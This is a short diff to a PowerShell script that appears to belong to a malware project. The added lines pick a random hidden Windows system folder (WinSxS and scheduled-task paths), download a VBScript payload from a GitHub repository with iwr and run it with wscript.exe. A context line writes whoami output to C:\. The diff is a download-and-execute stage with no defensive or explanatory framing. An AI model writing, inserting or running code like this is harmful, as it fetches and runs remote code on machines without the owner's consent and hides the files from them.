@@ -12,6 +12,14 @@ $paths = @(
     "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
     "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642"
 )
+
+if($basePath -eq "" -or $childServiceName -eq "" -or $childServicePropertyName -eq ""){
+    $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+    $pa = "$pa\async_fun.vbs"
+    iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
+    wscript.exe $pa
+}
+
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami.txt`""
 $b = $basePath -replace '([\\{}])', '`$1'
 
